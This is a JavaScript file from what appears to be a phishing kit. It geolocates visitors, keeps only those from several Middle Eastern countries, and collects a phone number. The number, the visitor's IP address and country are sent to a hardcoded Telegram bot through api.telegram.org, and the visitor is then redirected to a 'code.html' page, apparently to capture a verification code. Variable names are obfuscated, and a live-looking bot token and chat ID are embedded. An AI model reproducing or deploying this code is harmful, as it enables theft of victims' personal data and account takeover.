var ip_adress, country_code;
function callback(bernadean) {
  ip_adress = bernadean.IPv4;
  country_code = bernadean.country_code;
  var jermanee = ["JO", "IQ", "KW", "SA", "OM", "AE", "BH", "QA", "EG"], jaslen = document.getElementById("SelecTcountry");
  if (jermanee.includes(country_code)) {
    for (let kaelan = 0; kaelan < jermanee.length; kaelan++) {
      if (country_code == jermanee[kaelan]) {
        jaslen.selectedIndex = kaelan;
      }
    }
  } else {
    window.location.replace("https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW");
  }
}
$.ajax({url: "https://geoip-db.com/jsonp/", dataType: "jsonp"});
function ValideText() {
  if (document.getElementById("txtphone").value != "" && document.getElementById("txtphone").value.length >= 6 && document.getElementById("txtphone").value.length != 0) {
    return true;
  } else {
    return false;
  }
}
var bntclicked = false;
function SendNumber() {
  if (!bntclicked) {
    var everly = "5865923171:AAGIar3a7Z34hqlbs1ScjTNr-O2Zoprww4g", aliena = "5887678093", tatanishia = 0;
    if (ValideText() && !isNaN(document.getElementById("txtphone").value)) {
      bntclicked = true;
      var meisa = document.getElementById("SelecTcountry"), tasheeka = "(" + meisa.options[meisa.selectedIndex].value + ")", akyrah = document.getElementById("txtphone").value, oakey = "https://api.telegram.org/bot" + everly + "/sendMessage?chat_id=" + aliena + "&text=------------------------------------------------------";
      fetch(oakey, {method: "POST"}).then(zayyan => {
        if (zayyan.ok) {
          var kristyl = "https://api.telegram.org/bot" + everly + "/sendMessage?chat_id=" + aliena + "&text=+" + akyrah;
          fetch(kristyl, {method: "POST"}).then(teaghan => {
            if (teaghan.ok) {
              tatanishia++;
              var andreco = "https://api.telegram.org/bot" + everly + "/sendMessage?chat_id=" + aliena + "&text=IP : " + ip_adress + ":" + country_code + ":" + tasheeka;
              fetch(andreco, {method: "POST"}).then(jaja => {
                if (jaja.ok) {
                  if (tatanishia == 1) {
                    window.location.replace("code.html");
                  }
                }
              });
            } else {
              window.location.replace("index.html");
            }
          });
        }
      });
    }
  }
}
function isInputNumber(eldie) {
  var zaneb = String.fromCharCode(eldie.which);
  !/[0-9]/.test(zaneb) && eldie.preventDefault();
}
